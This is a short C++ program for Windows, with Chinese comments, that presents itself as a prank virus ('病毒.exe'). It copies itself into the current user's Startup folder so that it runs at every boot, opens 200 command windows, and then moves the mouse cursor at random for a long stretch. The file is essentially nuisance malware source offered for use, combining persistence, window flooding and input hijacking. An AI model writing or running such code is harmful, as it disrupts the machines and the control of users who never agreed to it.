#include <bits/stdc++.h>
#include <windows.h>
using namespace std;
long long X, Y;
int main()
{
  srand(time(0));
  system("copy 病毒.exe C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
  //把病毒复制C盘的自启动文件夹中，每次开机自动启动
  cout << "哈哈" << endl
       << "面对疾风吧！" << endl;
  for (int i = 1; i <= 200; i++)
    system("start cmd");
  cout << "最新内容：鼠标乱跑";
  for (int i = 0; i <= 100000; i++)
  {
    X = rand() % 1501;
    Y = rand() % 1301;
    SetCursorPos(X, Y);
    Sleep(10);
  }
  return 0;
}